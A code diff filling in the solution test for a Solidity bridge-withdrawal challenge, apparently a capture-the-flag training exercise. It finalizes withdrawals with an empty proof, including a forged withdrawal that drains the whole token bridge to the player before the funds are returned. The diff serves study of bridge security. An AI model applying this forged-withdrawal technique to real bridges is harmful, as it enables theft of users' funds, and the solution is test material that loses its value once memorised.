@@ -89,7 +89,116 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        vm.warp(block.timestamp + 7 days + 1 hours);
+
+        address l2HandlerAddr = address(l2Handler); // 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16
+        address l1ForwarderAddr = address(l1Forwarder); // 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5
+        address l1TokenBridgeAddr = address(l1TokenBridge);
+        bytes32[] memory proof = new bytes32[](0);
+
+        // Withdrawal 0
+        l1Gateway.finalizeWithdrawal(
+            0,
+            l2HandlerAddr,
+            l1ForwarderAddr,
+            1718786915,
+            abi.encodeWithSelector(
+                L1Forwarder.forwardMessage.selector,
+                0,
+                0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
+                l1TokenBridgeAddr,
+                abi.encodeWithSelector(
+                    TokenBridge.executeTokenWithdrawal.selector,
+                    0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
+                    10 ether
+                )
+            ),
+            proof
+        );
+
+        // Withdrawal 1
+        l1Gateway.finalizeWithdrawal(
+            1,
+            l2HandlerAddr,
+            l1ForwarderAddr,
+            1718786965,
+            abi.encodeWithSelector(
+                L1Forwarder.forwardMessage.selector,
+                1,
+                0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
+                l1TokenBridgeAddr,
+                abi.encodeWithSelector(
+                    TokenBridge.executeTokenWithdrawal.selector,
+                    0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
+                    10 ether
+                )
+            ),
+            proof
+        );
+
+        // Withdrawal 3
+        l1Gateway.finalizeWithdrawal(
+            3,
+            l2HandlerAddr,
+            l1ForwarderAddr,
+            1718787127,
+            abi.encodeWithSelector(
+                L1Forwarder.forwardMessage.selector,
+                3,
+                0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
+                l1TokenBridgeAddr,
+                abi.encodeWithSelector(
+                    TokenBridge.executeTokenWithdrawal.selector,
+                    0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
+                    10 ether
+                )
+            ),
+            proof
+        );
+
+        // Withdrawal 4 (Custom): Drain all funds to player
+        l1Gateway.finalizeWithdrawal(
+            4,
+            l2HandlerAddr,
+            l1ForwarderAddr,
+            0,
+            abi.encodeWithSelector(
+                L1Forwarder.forwardMessage.selector,
+                4,
+                player,
+                l1TokenBridgeAddr,
+                abi.encodeWithSelector(
+                    TokenBridge.executeTokenWithdrawal.selector,
+                    player,
+                    token.balanceOf(address(l1TokenBridge))
+                )
+            ),
+            proof
+        );
+
+        // Withdrawal 2 (Suspicious): 999,000 ether
+        // This should fail inside L1Forwarder because bridge is empty.
+        l1Gateway.finalizeWithdrawal(
+            2,
+            l2HandlerAddr,
+            l1ForwarderAddr,
+            1718787050,
+            abi.encodeWithSelector(
+                L1Forwarder.forwardMessage.selector,
+                2,
+                0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
+                l1TokenBridgeAddr,
+                abi.encodeWithSelector(
+                    TokenBridge.executeTokenWithdrawal.selector,
+                    0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
+                    999000 ether
+                )
+            ),
+            proof
+        );
+
+        // Return funds to bridge
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
     }
 
     /**
